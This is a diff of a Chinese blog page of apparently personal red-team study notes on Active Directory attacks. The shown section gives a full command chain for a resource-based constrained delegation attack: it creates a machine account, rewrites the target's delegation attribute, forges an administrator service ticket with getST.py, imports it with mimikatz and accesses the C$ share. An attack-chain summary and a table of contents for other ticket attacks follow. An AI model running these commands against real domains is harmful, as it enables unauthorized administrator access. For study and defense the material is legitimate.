+</span></span><span class="line"><span class="cl">根据查询出来的sid找出对应的用户名：
+</span></span><span class="line"><span class="cl">shell AdFind.exe -b &#34;DC=xiaodi,DC=local&#34; -f &#34;(&amp;(objectsid=S-1-5-21-1695257952-3088263962-2055235443-1104))&#34; objectclass cn dn
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> or 判断当前账户是否在Acount Operators组中（以下命令会列出域内在Acount Operators组中的账户）
+</span></span><span class="line"><span class="cl">shell adfind.exe -h [域控IP]:389 -s subtree -b CN=&#34;Account Operators&#34;,CN=Builtin,DC=xiaodi,DC=local member
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2、开始利用新增机器账户（三种方法进行创建，前两种要输入本机密码，第三种不用，具体选哪种根据实际自行判断。）
+</span></span><span class="line"><span class="cl">添加一个机器账户，用于申请票据
+</span></span><span class="line"><span class="cl"># 使用addcpmputer创建机器账户
+</span></span><span class="line"><span class="cl">python addcomputer.py xiaodi8.com/web2016:Xiaodi12345 -method LDAPS -computer-name test01\$ -computer-pass Passw0rd -dc-ip 192.168.139.11
+</span></span><span class="line"><span class="cl"># 使用bloodyAD工具创建机器账户
+</span></span><span class="line"><span class="cl">python bloodyAD.py -d redteam.lab -u web2016 -p &#39;Xiaodi12345&#39; --host 192.168.139.11 addComputer test01 &#39;Passw0rd&#39;
+</span></span><span class="line"><span class="cl"># 使用PowerMad工具创建机器账户
+</span></span><span class="line"><span class="cl">powershell Set-ExecutionPolicy Bypass -Scope Process
+</span></span><span class="line"><span class="cl">powershell Import-Module .\Powermad.ps1;New-MachineAccount -MachineAccount [机器账户名] -Password $(ConvertTo-SecureString &#34;123456&#34; -AsPlainText -Force)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">查询新建机器账户的SID值（后边有用）
+</span></span><span class="line"><span class="cl">	powershell Import-Module .\PowerView.ps1;Get-NetComputer [机器账户名] -Properties objectsid
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3、利用新增机器账户修改委派属性满足申请访问目标条件
+</span></span><span class="line"><span class="cl">修改目标主机的资源委派属性（目标机器:data）msds-allowedtoactonbehalfofotheridentity
+</span></span><span class="line"><span class="cl">修改目标主机委派属性：
+</span></span><span class="line"><span class="cl">powershell import-module .\powerview.ps1;$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;[自行创建机器账户的SID值])&#34;;$SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer [目标机器名:data] | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose 
+</span></span><span class="line"><span class="cl">验证和清除委派属性：（可以先不用，后续排查问题再用）
+</span></span><span class="line"><span class="cl">powershell import-module .\powerview.ps1;Get-DomainComputer data -Properties msds-allowedtoactonbehalfofotheridentity
+</span></span><span class="line"><span class="cl">powershell import-module .\powerview.ps1;Set-DomainObject data -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4、利用修改后的属性申请目标请求票据后导入利用
+</span></span><span class="line"><span class="cl">利用serviceA申请访问data主机cifs服务票据：
+</span></span><span class="line"><span class="cl">python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/datax.xiaodi.local -impersonate administrator
+</span></span><span class="line"><span class="cl">导入票据到内存：
+</span></span><span class="line"><span class="cl">mimikatz kerberos::ptc administrator.ccache
+</span></span><span class="line"><span class="cl">连接利用票据：
+</span></span><span class="line"><span class="cl">shell dir \\data.xiaodi.local\c$
 </span></span></code></pre></div><h2 id="攻击链梳理">
 <a class="header-anchor" href="#%e6%94%bb%e5%87%bb%e9%93%be%e6%a2%b3%e7%90%86"></a>
 攻击链梳理
 </h2><p>拿到域内普通主机 &mdash;&gt; 信息搜集：域架构、本机敏感文件 &mdash;-&gt; 提权 &mdash;-&gt; 提取ntlm-hash  &mdash;&gt; 利用hash爆破明文，利用CME攻击枚举域内密码是否一致，攻击服务 &mdash;-&gt; 枚举口令成功成功根据协议采用PTH方式 &mdash;-&gt; PTH 所用协议被堵死，利用NTML-hash生成票据 &mdash;&gt;</p>
-<hr>
-<p>Overpass-the-Hash（又称 Pass-the-Key）
-这是一种将窃取的 NTLM 哈希或 AES 密钥转换为 Kerberos 票据，从而在 Kerberos 优先的环境中实现横向移动的攻击技术。其核心是 “升级”凭据，从仅能用于 NTLM 认证的哈希，升级为功能更全的 Kerberos TGT（票证授予票证）</p>
-<hr>
-<p>白银票据伪造</p>
-<hr>
 </div>
     <footer class="article-footer"><ul class="article-category-list"><li class="article-tag-list-item" data-aos="zoom-in">
     <a
@@ -850,7 +1322,7 @@ Kerberoasting攻击
     aria-label="Article navigation"
     data-aos="fade-up"
   ><div class="article-nav-link-wrap left"><img
-              data-src="https://d-sketon.top/img/_backwebp/bg22.webp"
+              data-src="https://d-sketon.top/img/_backwebp/bg27.webp"
               data-sizes="auto"
               alt="htb-Base"
               class="lazyload"
@@ -894,10 +1366,10 @@ Kerberoasting攻击
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;91.5k</span
+          >&nbsp;103.5k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;03:48</span>
+        <span class="icon-coffee">&nbsp;04:12</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -939,6 +1411,17 @@ Kerberoasting攻击
         <li><a href="#利用低速密码枚举手段横向">利用低速密码枚举手段横向</a></li>
         <li><a href="#读取内存后无法获取明文密码时的解决思路">读取内存后无法获取明文密码时的解决思路：</a></li>
         <li><a href="#票据传递ptt">票据传递（PTT）</a></li>
+        <li><a href="#利用ms14-068漏洞进行票据传递">利用MS14-068漏洞进行票据传递</a></li>
+        <li><a href="#利用ntml-hash生成票据">利用NTML-hash生成票据</a></li>
+        <li><a href="#从机器历史缓存提取tgt票据并重新认证">从机器历史缓存提取TGT票据，并重新认证</a></li>
+        <li><a href="#kerberoasting攻击">Kerberoasting攻击</a></li>
+        <li><a href="#密钥传递攻击ptk">密钥传递攻击（PTK）</a></li>
+        <li><a href="#kb2871997补丁对域环境的影响">KB2871997补丁对域环境的影响</a></li>
+        <li><a href="#委派">委派</a></li>
+        <li><a href="#非约束委派攻击">非约束委派攻击</a></li>
+        <li><a href="#约束委派攻击-有点复杂还没有捋顺">约束委派攻击 (有点复杂，还没有捋顺)</a></li>
+        <li><a href="#关于约束和非约束委派的思考">关于约束和非约束委派的思考</a></li>
+        <li><a href="#资源约束委派攻击">资源约束委派攻击</a></li>
       </ul>
     </li>
     <li><a href="#攻击链梳理">攻击链梳理</a></li>
